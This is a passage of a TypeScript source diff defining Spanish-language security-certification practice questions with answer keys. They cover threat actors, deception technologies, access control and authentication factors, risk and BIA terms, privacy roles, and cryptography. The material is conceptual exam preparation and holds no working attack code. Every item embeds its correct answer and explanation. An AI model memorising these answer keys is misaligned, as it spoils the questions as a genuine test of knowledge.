+            explanation: 'Pasar de una cuenta de servicio a root es escalada de privilegios vertical. Mínimo privilegio y parcheo del kernel.',
+          },
+        ],
+      },
+    ],
+  },
+};
+
+// ---------------------------------------------------------------------------
+// PBQ 56 — Threat actors, motivations and deception technologies (2.1 / 1.2)
+// ---------------------------------------------------------------------------
+const ACTORS = [
+  o('nation_state', 'Estado-nación (APT)'),
+  o('organized_crime', 'Crimen organizado'),
+  o('hacktivist', 'Hacktivista'),
+  o('insider', 'Amenaza interna (Insider)'),
+  o('unskilled', 'Atacante no calificado (Unskilled attacker)'),
+  o('shadow_it', 'Shadow IT'),
+];
+const MOTIVATIONS = [
+  o('espionage', 'Espionaje'),
+  o('financial', 'Ganancia financiera'),
+  o('philosophical', 'Creencias filosóficas / políticas'),
+  o('revenge', 'Venganza'),
+  o('chaos', 'Disrupción / caos'),
+  o('war', 'Guerra'),
+  o('blackmail', 'Chantaje'),
+  o('none', 'Sin intención maliciosa (conveniencia)'),
+];
+const DECEPTION = [
+  o('honeypot', 'Honeypot'),
+  o('honeynet', 'Honeynet'),
+  o('honeyfile', 'Honeyfile'),
+  o('honeytoken', 'Honeytoken'),
+  o('sinkhole', 'DNS sinkhole'),
+];
+
+const PBQ56: MatrixPbqDefinition = {
+  item: item(
+    56,
+    'threat-actors',
+    'Actores de Amenaza y Engaño',
+    'Perfilado de Actores de Amenaza, Motivaciones y Tecnologías de Engaño',
+    ['2.1', ['1.2']],
+    5,
+    'El equipo de inteligencia de amenazas (CTI) debe preparar el informe trimestral para la dirección. Recibes un resumen de incidentes observados en el sector y debes perfilar al actor y su motivación principal. Además, el SOC desplegó varias tecnologías de engaño y necesitas identificarlas correctamente en el informe.',
+    [
+      'Sección 1: identifica el tipo de actor de amenaza y su motivación principal.',
+      'Sección 2: identifica la tecnología de engaño desplegada.',
+    ],
+    'Recursos ilimitados + sigilo durante meses = estado-nación (APT). Rescate o venta de datos = crimen organizado. Mensaje político = hacktivista. Acceso legítimo previo = insider. Herramientas descargadas sin entenderlas = unskilled attacker. Sin malicia, solo saltarse a TI = shadow IT.'
+  ),
+  config: {
+    pbqId: 'pbq-56',
+    consoleTitle: 'Informe CTI Trimestral (Objetivos 2.1 y 1.2)',
+    instructions: 'Completa el perfil de cada incidente y la tabla de tecnologías de engaño.',
+    sections: [
+      {
+        id: 's1',
+        title: 'Perfil de actores',
+        columns: [
+          { id: 'actor', label: 'Actor de amenaza', options: ACTORS },
+          { id: 'motivation', label: 'Motivación principal', options: MOTIVATIONS },
+        ],
+        rows: [
+          {
+            id: 't1',
+            prompt: 'Un grupo con financiamiento gubernamental mantuvo acceso sigiloso durante 18 meses en un contratista de defensa y extrajo planos de misiles.',
+            answers: { actor: 'nation_state', motivation: 'espionage' },
+            explanation: 'Recursos de un gobierno, persistencia prolongada (APT) y robo de secretos: estado-nación con motivación de espionaje.',
+          },
+          {
+            id: 't2',
+            prompt: 'Un grupo cifra los servidores de un hospital y exige 40 BTC; tiene un "servicio de atención" para negociar con las víctimas.',
+            answers: { actor: 'organized_crime', motivation: 'financial' },
+            explanation: 'Estructura empresarial y rescate: crimen organizado con motivación financiera.',
+          },
+          {
+            id: 't3',
+            prompt: 'El sitio web de una petrolera aparece desfigurado con mensajes contra el cambio climático.',
+            answers: { actor: 'hacktivist', motivation: 'philosophical' },
+            explanation: 'Defacement con mensaje ideológico: hacktivista con creencias filosóficas/políticas.',
+          },
+          {
+            id: 't4',
+            prompt: 'Un administrador despedido usa una cuenta que nunca se deshabilitó para borrar los backups una semana después de su salida.',
+            answers: { actor: 'insider', motivation: 'revenge' },
+            explanation: 'Usa acceso legítimo previo (insider) y actúa por resentimiento (venganza). Lección: offboarding inmediato.',
+          },
+          {
+            id: 't5',
+            prompt: 'Un adolescente descarga una herramienta DDoS de un foro y la lanza contra el servidor de un videojuego "para ver qué pasa".',
+            answers: { actor: 'unskilled', motivation: 'chaos' },
+            explanation: 'Usa herramientas ajenas sin conocimiento profundo: unskilled attacker, buscando disrupción/caos.',
+          },
+          {
+            id: 't6',
+            prompt: 'El equipo de marketing contrata un servicio de almacenamiento en la nube sin aprobación de TI y sube allí la base de clientes.',
+            answers: { actor: 'shadow_it', motivation: 'none' },
+            explanation: 'Uso de tecnología no autorizada sin intención maliciosa: shadow IT. Sigue siendo un riesgo de fuga de datos.',
+          },
+          {
+            id: 't7',
+            prompt: 'Un ataque deja sin electricidad a una región de un país rival horas antes de una operación militar.',
+            answers: { actor: 'nation_state', motivation: 'war' },
+            explanation: 'Ataque a infraestructura crítica coordinado con acciones militares: estado-nación con motivación de guerra.',
+          },
+        ],
+      },
+      {
+        id: 's2',
+        title: 'Tecnologías de engaño',
+        columns: [{ id: 'tech', label: 'Tecnología', options: DECEPTION }],
+        rows: [
+          {
+            id: 'd1',
+            prompt: 'Un único servidor falso con servicios vulnerables, aislado y monitoreado, para atraer y estudiar atacantes.',
+            answers: { tech: 'honeypot' },
+            explanation: 'Un sistema señuelo individual es un honeypot.',
+          },
+          {
+            id: 'd2',
+            prompt: 'Una red completa de servidores, estaciones y routers señuelo que simula un entorno real.',
+            answers: { tech: 'honeynet' },
+            explanation: 'Varios honeypots interconectados forman una honeynet.',
+          },
+          {
+            id: 'd3',
+            prompt: 'Un archivo llamado "contraseñas_admin.xlsx" en un recurso compartido que genera una alerta en cuanto alguien lo abre.',
+            answers: { tech: 'honeyfile' },
+            explanation: 'Un archivo señuelo atractivo es un honeyfile.',
+          },
+          {
+            id: 'd4',
+            prompt: 'Una clave de acceso de AWS falsa incrustada en un repositorio; cualquier intento de usarla alerta al SOC.',
+            answers: { tech: 'honeytoken' },
+            explanation: 'Un dato o credencial falsa cuyo uso delata al atacante es un honeytoken.',
+          },
+          {
+            id: 'd5',
+            prompt: 'El resolver DNS interno responde a los dominios C2 conocidos con la IP de un servidor controlado por el SOC.',
+            answers: { tech: 'sinkhole' },
+            explanation: 'Redirigir dominios maliciosos a un destino controlado es un DNS sinkhole; permite identificar hosts infectados.',
+          },
+        ],
+      },
+    ],
+  },
+};
+
+// ---------------------------------------------------------------------------
+// PBQ 57 — Access control models, authentication factors and PAM (4.6 / 1.2)
+// ---------------------------------------------------------------------------
+const AC_MODELS = [
+  o('mac', 'MAC (Mandatory Access Control)'),
+  o('dac', 'DAC (Discretionary Access Control)'),
+  o('rbac', 'RBAC (Role-Based Access Control)'),
+  o('abac', 'ABAC (Attribute-Based Access Control)'),
+  o('rule', 'Basado en reglas (Rule-based)'),
+];
+const AUTH_FACTORS = [
+  o('know', 'Algo que sabes (Something you know)'),
+  o('have', 'Algo que tienes (Something you have)'),
+  o('are', 'Algo que eres (Something you are)'),
+  o('where', 'Algún lugar donde estás (Somewhere you are)'),
+];
+const PAM_TOOLS = [
+  o('jit', 'Permisos Just-in-Time (JIT)'),
+  o('vaulting', 'Bóveda de contraseñas (Password vaulting)'),
+  o('ephemeral', 'Credenciales efímeras (Ephemeral credentials)'),
+];
+
+const PBQ57: MatrixPbqDefinition = {
+  item: item(
+    57,
+    'access-control-models',
+    'Modelos de Acceso y Autenticación',
+    'Modelos de Control de Acceso, Factores de Autenticación y PAM',
+    ['4.6', ['1.2']],
+    6,
+    'La empresa unificará el control de acceso de varias aplicaciones heredadas tras una fusión. El arquitecto de identidad te pide documentar qué modelo de control de acceso usa cada sistema, qué factor de autenticación representa cada método que se ofrece a los usuarios y qué herramienta de gestión de acceso privilegiado (PAM) describe cada requisito del proyecto.',
+    [
+      'Sección 1: identifica el modelo de control de acceso de cada sistema.',
+      'Sección 2: clasifica cada método de autenticación por su factor.',
+      'Sección 3: identifica la herramienta PAM correspondiente.',
+    ],
+    'MAC = etiquetas de clasificación que el usuario NO puede cambiar. DAC = el dueño del recurso decide. RBAC = permisos por puesto/rol. ABAC = combinación de atributos (usuario, recurso, entorno). Rule-based = reglas globales iguales para todos (p. ej. horario). Un código TOTP es "algo que tienes" (el dispositivo con la semilla), no "algo que sabes".'
+  ),
+  config: {
+    pbqId: 'pbq-57',
+    consoleTitle: 'Inventario de Identidad Post-Fusión (Objetivo 4.6)',
+    instructions: 'Completa las tres tablas del inventario de identidad.',
+    sections: [
+      {
+        id: 's1',
+        title: 'Modelo de control de acceso',
+        columns: [{ id: 'model', label: 'Modelo', options: AC_MODELS }],
+        rows: [
+          {
+            id: 'm1',
+            prompt: 'Los documentos están etiquetados como Confidencial, Secreto o Alto Secreto; solo se leen con una autorización igual o superior y el usuario no puede cambiar las etiquetas.',
+            answers: { model: 'mac' },
+            explanation: 'Etiquetas y niveles de autorización impuestos por el sistema/administrador: MAC.',
+          },
+          {
+            id: 'm2',
+            prompt: 'En el servidor de archivos, el creador de cada carpeta decide a quién otorga permisos de lectura o escritura.',
+            answers: { model: 'dac' },
+            explanation: 'El propietario del recurso controla el acceso: DAC (modelo de NTFS por defecto).',
+          },
+          {
+            id: 'm3',
+            prompt: 'Los permisos del ERP se asignan al puesto "Contador"; cuando alguien cambia de puesto pierde esos permisos y recibe los del nuevo.',
+            answers: { model: 'rbac' },
+            explanation: 'Permisos ligados al rol/puesto de trabajo: RBAC.',
+          },
+          {
+            id: 'm4',
+            prompt: 'El acceso al portal de nómina se concede si departamento = Finanzas Y dispositivo = gestionado Y país = Argentina.',
+            answers: { model: 'abac' },
+            explanation: 'Evalúa múltiples atributos del usuario, del recurso y del contexto: ABAC.',
+          },
+          {
+            id: 'm5',
+            prompt: 'El sistema de control de producción solo permite iniciar sesión de lunes a viernes de 08:00 a 18:00 a cualquier usuario.',
+            answers: { model: 'rule' },
+            explanation: 'Una regla global aplicada a todos, independientemente de la identidad: rule-based (restricción horaria).',
+          },
+        ],
+      },
+      {
+        id: 's2',
+        title: 'Factores de autenticación',
+        columns: [{ id: 'factor', label: 'Factor', options: AUTH_FACTORS }],
+        rows: [
+          { id: 'f1', prompt: 'PIN de 6 dígitos para desbloquear el portátil.', answers: { factor: 'know' }, explanation: 'Un secreto memorizado: algo que sabes.' },
+          { id: 'f2', prompt: 'Llave de seguridad FIDO2 conectada por USB.', answers: { factor: 'have' }, explanation: 'Un token físico: algo que tienes.' },
+          { id: 'f3', prompt: 'Código de 6 dígitos generado por una app autenticadora (TOTP).', answers: { factor: 'have' }, explanation: 'El código prueba la posesión del dispositivo con la semilla: algo que tienes.' },
+          { id: 'f4', prompt: 'Lector de huella dactilar en el control de acceso.', answers: { factor: 'are' }, explanation: 'Biometría: algo que eres.' },
+          { id: 'f5', prompt: 'El acceso solo se permite si la IP del usuario se geolocaliza dentro de la oficina.', answers: { factor: 'where' }, explanation: 'Basado en ubicación: algún lugar donde estás.' },
+          { id: 'f6', prompt: 'Respuesta a la pregunta "¿Nombre de tu primera mascota?".', answers: { factor: 'know' }, explanation: 'Sigue siendo un conocimiento: contraseña + pregunta de seguridad NO es MFA (mismo factor dos veces).' },
+        ],
+      },
+      {
+        id: 's3',
+        title: 'Gestión de acceso privilegiado (PAM)',
+        columns: [{ id: 'tool', label: 'Herramienta PAM', options: PAM_TOOLS }],
+        rows: [
+          { id: 'k1', prompt: 'Las contraseñas de las cuentas de administrador se guardan en una bóveda y se rotan automáticamente después de cada uso.', answers: { tool: 'vaulting' }, explanation: 'Almacenar y rotar credenciales privilegiadas: password vaulting.' },
+          { id: 'k2', prompt: 'Los permisos de administrador del dominio se conceden solo por 1 hora tras aprobación del jefe y luego se revocan.', answers: { tool: 'jit' }, explanation: 'Privilegios temporales concedidos bajo demanda: just-in-time.' },
+          { id: 'k3', prompt: 'Para cada sesión de mantenimiento se genera una credencial única que deja de existir al cerrar la sesión.', answers: { tool: 'ephemeral' }, explanation: 'Credenciales de un solo uso con vida corta: ephemeral credentials.' },
+        ],
+      },
+    ],
+  },
+};
+
+// ---------------------------------------------------------------------------
+// PBQ 58 — Risk management concepts and BIA (5.2)
+// ---------------------------------------------------------------------------
+const RISK_TERMS = [
+  o('appetite', 'Apetito de riesgo (Risk appetite)'),
+  o('tolerance', 'Tolerancia al riesgo (Risk tolerance)'),
+  o('register', 'Registro de riesgos (Risk register)'),
+  o('owner', 'Dueño del riesgo (Risk owner)'),
+  o('kri', 'Indicador clave de riesgo (KRI)'),
+  o('inherent', 'Riesgo inherente'),
+  o('residual', 'Riesgo residual'),
+  o('exception', 'Excepción / exención de riesgo'),
+  o('mttr', 'MTTR'),
+  o('mtbf', 'MTBF'),
+  o('rto', 'RTO'),
+  o('rpo', 'RPO'),
+];
+
+const PBQ58: MatrixPbqDefinition = {
+  item: item(
+    58,
+    'risk-concepts',
+    'Gestión de Riesgos',
+    'Terminología de Gestión de Riesgos y Análisis de Impacto al Negocio (BIA)',
+    ['5.2', ['3.4']],
+    5,
+    'El comité de riesgos prepara el informe anual para el directorio. Se te entregan extractos del informe y del análisis de impacto al negocio (BIA) del e-commerce: identifica el término de gestión de riesgos que corresponde a cada extracto.',
+    [
+      'Relaciona cada extracto con el término de gestión de riesgos o de BIA correcto.',
+      'Distingue apetito (estrategia general) de tolerancia (desviación aceptable concreta).',
+      'Distingue métricas de recuperación (RTO/RPO) de métricas de fiabilidad (MTTR/MTBF).',
+    ],
+    'RPO = cuántos DATOS (medidos en tiempo) puedes perder → define la frecuencia de backup. RTO = cuánto TIEMPO puede estar caído el servicio. MTBF = tiempo promedio ENTRE fallos (fiabilidad). MTTR = tiempo promedio para REPARAR. Inherente = antes de controles; residual = después.'
+  ),
+  config: {
+    pbqId: 'pbq-58',
+    consoleTitle: 'Informe Anual de Riesgos y BIA (Objetivo 5.2)',
+    instructions: 'Selecciona el término que describe cada extracto.',
+    sections: [
+      {
+        id: 's1',
+        title: 'Extractos del informe',
+        columns: [{ id: 'term', label: 'Término', options: RISK_TERMS }],
+        rows: [
+          { id: 'k1', prompt: 'El directorio declara que acepta niveles moderados de riesgo para crecer rápidamente en nuevos mercados.', answers: { term: 'appetite' }, explanation: 'Cantidad y tipo de riesgo que la organización está dispuesta a asumir para lograr sus objetivos (apetito expansivo).' },
+          { id: 'k2', prompt: 'Se acepta como máximo 4 horas de indisponibilidad del e-commerce por trimestre antes de escalar al directorio.', answers: { term: 'tolerance' }, explanation: 'Desviación específica y medible aceptable respecto al objetivo: tolerancia.' },
+          { id: 'k3', prompt: 'Documento que lista cada riesgo con su probabilidad, impacto, responsable, controles y estado.', answers: { term: 'register' }, explanation: 'El risk register centraliza la información de cada riesgo identificado.' },
+          { id: 'k4', prompt: 'El director de RR.HH. es responsable de gestionar y aceptar el riesgo del sistema de nómina.', answers: { term: 'owner' }, explanation: 'La persona que rinde cuentas por un riesgo concreto es el risk owner.' },
+          { id: 'k5', prompt: 'Métrica mensual: "% de servidores con parches críticos pendientes hace más de 30 días", con alerta si supera el 5%.', answers: { term: 'kri' }, explanation: 'Métrica con umbral que anticipa el aumento de un riesgo: KRI.' },
+          { id: 'k6', prompt: 'Nivel de riesgo del ataque de ransomware si la empresa no tuviera ningún control implementado.', answers: { term: 'inherent' }, explanation: 'Riesgo antes de aplicar controles: inherente.' },
+          { id: 'k7', prompt: 'Nivel de riesgo que permanece después de implementar EDR, backups inmutables y MFA.', answers: { term: 'residual' }, explanation: 'Riesgo remanente tras los controles: residual. Debe estar dentro del apetito de riesgo.' },
+          { id: 'k8', prompt: 'Un sistema legado no puede cumplir la política de cifrado; la dirección aprueba formalmente y por 6 meses el incumplimiento con controles compensatorios.', answers: { term: 'exception' }, explanation: 'Aprobación formal y temporal para no cumplir una política: excepción/exención.' },
+          { id: 'k9', prompt: 'En promedio, el equipo tarda 3 horas en reparar y devolver al servicio un servidor que falla.', answers: { term: 'mttr' }, explanation: 'Mean Time To Repair: tiempo promedio de reparación.' },
+          { id: 'k10', prompt: 'Los discos de la cabina funcionan en promedio 120.000 horas entre una falla y la siguiente.', answers: { term: 'mtbf' }, explanation: 'Mean Time Between Failures: mide la fiabilidad del componente.' },
+          { id: 'k11', prompt: 'El negocio no puede perder más de 15 minutos de pedidos; por eso la base de datos se replica cada 15 minutos.', answers: { term: 'rpo' }, explanation: 'Pérdida máxima de datos aceptable medida en tiempo: RPO. Determina la frecuencia de backup/replicación.' },
+          { id: 'k12', prompt: 'Tras un desastre, el e-commerce debe volver a estar operativo en un máximo de 2 horas.', answers: { term: 'rto' }, explanation: 'Tiempo máximo para restaurar el servicio: RTO. Determina el tipo de sitio de recuperación.' },
+        ],
+      },
+    ],
+  },
+};
+
+// ---------------------------------------------------------------------------
+// PBQ 59 — Compliance, privacy and security awareness (5.4 / 5.6)
+// ---------------------------------------------------------------------------
+const COMPLIANCE_TERMS = [
+  o('controller', 'Responsable del tratamiento (Data controller)'),
+  o('processor', 'Encargado del tratamiento (Data processor)'),
+  o('subject', 'Titular de los datos (Data subject)'),
+  o('right_forgotten', 'Derecho al olvido'),
+  o('fines', 'Multas (Fines)'),
+  o('loss_license', 'Pérdida de licencia'),
+  o('reputation', 'Daño reputacional'),
+  o('phishing_campaign', 'Campaña de phishing simulado'),
+  o('risky', 'Comportamiento riesgoso (Risky)'),
+  o('unexpected', 'Comportamiento inesperado (Unexpected)'),
+  o('unintentional', 'Comportamiento no intencional (Unintentional)'),
+];
+
+const PBQ59: MatrixPbqDefinition = {
+  item: item(
+    59,
+    'compliance-awareness',
+    'Cumplimiento y Concienciación',
+    'Cumplimiento Normativo, Privacidad y Programa de Concienciación',
+    ['5.4', ['5.6']],
+    5,
+    'La empresa procesa datos de clientes europeos y pagos con tarjeta. El Data Protection Officer prepara la capacitación anual y el informe de cumplimiento, e incluye casos reales del último año. Identifica el rol de privacidad, la consecuencia de incumplimiento o el comportamiento que ilustra cada caso para el programa de concienciación.',
+    [
+      'Identifica los roles de privacidad (responsable, encargado, titular) y derechos de los titulares.',
+      'Identifica las consecuencias de incumplimiento.',
+      'Clasifica los comportamientos anómalos que el programa de concienciación enseña a reconocer.',
+    ],
+    'Controller = DECIDE para qué y cómo se tratan los datos (normalmente tu empresa). Processor = trata los datos POR CUENTA del controller (el proveedor SaaS). Comportamiento: riesgoso = el usuario sabe que hace algo arriesgado; inesperado = se desvía del patrón normal; no intencional = error sin intención.'
+  ),
+  config: {
+    pbqId: 'pbq-59',
+    consoleTitle: 'Informe de Cumplimiento y Capacitación Anual (Objetivos 5.4 y 5.6)',
+    instructions: 'Clasifica cada caso con el término correcto. Algunas opciones pueden no usarse.',
+    sections: [
+      {
+        id: 's1',
+        title: 'Casos del año',
+        columns: [{ id: 'term', label: 'Término', options: COMPLIANCE_TERMS }],
+        rows: [
+          { id: 'c1', prompt: 'La empresa decide qué datos personales recoge de sus clientes y con qué finalidad.', answers: { term: 'controller' }, explanation: 'Quien determina finalidades y medios del tratamiento es el responsable (controller).' },
+          { id: 'c2', prompt: 'El proveedor SaaS de nómina procesa los datos de los empleados siguiendo las instrucciones de la empresa.', answers: { term: 'processor' }, explanation: 'Trata los datos por cuenta del controller: encargado (processor).' },
+          { id: 'c3', prompt: 'Una clienta de Madrid cuyos datos personales están en el CRM de la empresa.', answers: { term: 'subject' }, explanation: 'La persona identificable a quien pertenecen los datos es el titular (data subject).' },
+          { id: 'c4', prompt: 'Un cliente solicita que se eliminen todos sus datos personales y la empresa debe borrarlos de sus sistemas.', answers: { term: 'right_forgotten' }, explanation: 'Derecho de supresión del GDPR: derecho al olvido.' },
+          { id: 'c5', prompt: 'El regulador europeo impone una sanción equivalente al 2% de la facturación anual por una brecha no notificada.', answers: { term: 'fines' }, explanation: 'Sanción económica impuesta por un regulador: multa.' },
+          { id: 'c6', prompt: 'Tras incumplir PCI DSS reiteradamente, el comercio pierde la autorización para procesar pagos con tarjeta.', answers: { term: 'loss_license' }, explanation: 'Perder la autorización para operar una actividad regulada es pérdida de licencia.' },
+          { id: 'c7', prompt: 'Un empleado hace clic en un correo falso enviado por el equipo de seguridad y es redirigido a una micro-capacitación.', answers: { term: 'phishing_campaign' }, explanation: 'Las campañas de phishing simulado miden y entrenan la capacidad de reconocimiento.' },
+          { id: 'c8', prompt: 'Un empleado conecta a su estación de trabajo un USB que encontró en el estacionamiento.', answers: { term: 'risky' }, explanation: 'Acción que el usuario podría saber que es peligrosa: comportamiento riesgoso.' },
+          { id: 'c9', prompt: 'Un empleado del área contable inicia sesión a las 3:00 desde un país donde la empresa no opera.', answers: { term: 'unexpected' }, explanation: 'Se desvía del patrón normal del usuario: comportamiento inesperado (posible cuenta comprometida).' },
+          { id: 'c10', prompt: 'Una analista envía por error la planilla de sueldos a un destinatario externo con un nombre parecido al de su jefe.', answers: { term: 'unintentional' }, explanation: 'Error sin intención maliciosa: comportamiento no intencional.' },
+        ],
+      },
+    ],
+  },
+};
+
+// ---------------------------------------------------------------------------
+// PBQ 61 — Cryptographic concepts and key-protection tools (1.4)
+// ---------------------------------------------------------------------------
+const CRYPTO_TECHNIQUES = [
+  o('hashing', 'Hashing'),
+  o('salting', 'Salting'),
+  o('stretching', 'Key stretching'),
+  o('signature', 'Firma digital'),
+  o('symmetric', 'Cifrado simétrico'),
+  o('asymmetric', 'Cifrado asimétrico'),
+  o('key_exchange', 'Intercambio de claves'),
+  o('steganography', 'Esteganografía'),
+  o('tokenization', 'Tokenización'),
+];
+const KEY_TOOLS = [
+  o('tpm', 'TPM (Trusted Platform Module)'),
+  o('hsm', 'HSM (Hardware Security Module)'),
+  o('kms', 'KMS (Key Management Service)'),
+  o('enclave', 'Secure enclave'),
+  o('escrow', 'Key escrow'),
+];
+
+const PBQ61: MatrixPbqDefinition = {
+  item: item(
+    61,
+    'crypto-concepts',
+    'Conceptos Criptográficos',
+    'Hashing, Salting, Key Stretching, Firmas Digitales y Protección de Claves',
+    ['1.4', []],
+    5,
+    'El equipo de arquitectura documenta cómo se protege la información en cada sistema de la empresa. Te piden identificar la técnica criptográfica que describe cada control y la herramienta que protege las claves en cada caso, para el informe que revisará el auditor.',
+    [
+      'Sección 1: identifica la técnica criptográfica descrita en cada control.',
+      'Sección 2: identifica la herramienta de protección de claves de cada caso.',
+    ],
+    'Hash = integridad, irreversible y de longitud fija. Salt = valor aleatorio por usuario contra rainbow tables. Key stretching (PBKDF2, bcrypt) = muchas iteraciones para frenar la fuerza bruta. Firma = hash cifrado con la clave PRIVADA del emisor (integridad + no repudio). Para confidencialidad hacia un destinatario se usa SU clave PÚBLICA. TPM = chip del equipo; HSM = appliance dedicado; KMS = servicio cloud.'
+  ),
+  config: {
+    pbqId: 'pbq-61',
+    consoleTitle: 'Inventario Criptográfico Corporativo (Objetivo 1.4)',
+    instructions: 'Selecciona la técnica o herramienta que corresponde a cada control.',
+    sections: [
+      {
+        id: 's1',
+        title: 'Técnicas criptográficas',
+        columns: [{ id: 'technique', label: 'Técnica', options: CRYPTO_TECHNIQUES }],
+        rows: [
+          { id: 'c1', prompt: 'El portal guarda un valor de longitud fija derivado de cada contraseña, que no puede revertirse para obtener la original.', answers: { technique: 'hashing' }, explanation: 'Función unidireccional de longitud fija: hashing. No es cifrado porque no existe clave para revertirlo.' },
+          { id: 'c2', prompt: 'Antes de calcular el hash se añade un valor aleatorio único por usuario, así dos usuarios con la misma contraseña tienen hashes distintos y las rainbow tables no sirven.', answers: { technique: 'salting' }, explanation: 'El salt aleatorio por cuenta inutiliza las tablas precalculadas.' },
+          { id: 'c3', prompt: 'La contraseña se procesa con bcrypt/PBKDF2 aplicando miles de iteraciones para que cada intento de fuerza bruta sea lento.', answers: { technique: 'stretching' }, explanation: 'Aumentar el costo computacional de derivar la clave es key stretching.' },
+          { id: 'c4', prompt: 'El CFO firma un contrato con su clave privada; el receptor lo verifica con la clave pública del CFO y así este no puede negar haberlo enviado.', answers: { technique: 'signature' }, explanation: 'Firma digital: integridad, autenticación y no repudio.' },
+          { id: 'c5', prompt: 'Un disco de 2 TB se cifra rápidamente con AES-256 usando una única clave secreta.', answers: { technique: 'symmetric' }, explanation: 'Una sola clave compartida y alto rendimiento para grandes volúmenes: cifrado simétrico.' },
+          { id: 'c6', prompt: 'Un correo se cifra con la clave pública del destinatario para que solo su clave privada pueda descifrarlo.', answers: { technique: 'asymmetric' }, explanation: 'Par de claves pública/privada: cifrado asimétrico. Para confidencialidad se usa la clave pública del DESTINATARIO.' },
+          { id: 'c7', prompt: 'Dos servidores acuerdan una clave de sesión secreta a través de Internet sin transmitir nunca la clave (Diffie-Hellman).', answers: { technique: 'key_exchange' }, explanation: 'Diffie-Hellman/ECDHE es un mecanismo de intercambio de claves; con claves efímeras aporta Perfect Forward Secrecy.' },
+          { id: 'c8', prompt: 'Un empleado oculta datos robados dentro de los bits menos significativos de fotos que sube a una red social.', answers: { technique: 'steganography' }, explanation: 'Ocultar la existencia de la información dentro de otro archivo es esteganografía (oculta, no cifra).' },
+        ],
+      },
+      {
+        id: 's2',
+        title: 'Protección de claves',
+        columns: [{ id: 'tool', label: 'Herramienta', options: KEY_TOOLS }],
+        rows: [
+          { id: 'k1', prompt: 'Chip en la placa base del portátil que guarda la clave de BitLocker y verifica la integridad del arranque.', answers: { tool: 'tpm' }, explanation: 'El TPM está integrado en el equipo y ancla el cifrado de disco y el arranque medido.' },
+          { id: 'k2', prompt: 'Appliance dedicado y certificado FIPS 140 en el data center de la CA interna que genera y protege las claves privadas raíz.', answers: { tool: 'hsm' }, explanation: 'Dispositivo de hardware dedicado, resistente a manipulación y de alto rendimiento: HSM.' },
+          { id: 'k3', prompt: 'Servicio del proveedor cloud para crear, rotar y auditar las claves que cifran los buckets de almacenamiento.', answers: { tool: 'kms' }, explanation: 'Gestión centralizada de claves como servicio: KMS.' },
+          { id: 'k4', prompt: 'Zona aislada del procesador del teléfono que procesa la huella y las claves sin exponerlas al sistema operativo.', answers: { tool: 'enclave' }, explanation: 'Secure enclave: coprocesador aislado dentro del SoC.' },
+          { id: 'k5', prompt: 'Un tercero de confianza guarda una copia de las claves de cifrado para recuperarlas si se pierden o por orden judicial.', answers: { tool: 'escrow' }, explanation: 'Depositar claves con un tercero para su recuperación es key escrow.' },
+        ],
+      },
+    ],
+  },
+};
+
+export const MATRIX_PBQS: MatrixPbqDefinition[] = [PBQ51, PBQ52, PBQ53, PBQ54, PBQ55, PBQ56, PBQ57, PBQ58, PBQ59, PBQ61];
